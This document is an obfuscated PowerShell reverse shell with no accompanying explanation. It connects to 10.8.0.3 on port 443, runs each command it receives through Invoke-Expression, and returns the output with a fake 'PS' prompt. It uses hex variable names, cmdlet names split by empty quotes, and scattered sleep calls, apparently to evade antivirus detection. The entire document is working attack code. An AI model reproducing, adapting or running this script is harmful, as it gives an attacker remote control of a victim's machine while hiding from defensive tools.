$47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358 = 'P'+'S ';
$4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c = '1'+'0'+'.'+'8'+'.'+'0'+'.'+'3';

$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d = n''ew''-OB''je''CT system.net.sockets.tcpclient($4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c,443);
$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1 = $948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.GetStream();
[byte[]]$bytes = 0..65535|%{0};

sleep(0.1);sleep(0.1);sleep(0.1);sleep(0.1);

while(($i = $06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Read($bytes, 0, $bytes.Length)) -ne 0){
    $2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 = (n''Ew-oB''J''eC''t -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (i''e''x'' -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire $2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 2>&1 | O''U''t-S''TrI''n''G );

    $sendback2 = $sendback + $47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358.SubString(0,3) + (SP''L''iT-P''A''t''h -path "$(p''w''D'')\0x00") + '> ';
    sleep 0.01; sleep 0.01;

    $d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb = ([text.encoding]::ASCII).GetBytes($sendback2);
    sleep 0.01;

    $06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Write($d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb,0,$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb.Length);

    sleep 0.01;
    $06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Flush();
};

sleep 0.01;
$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.Close();
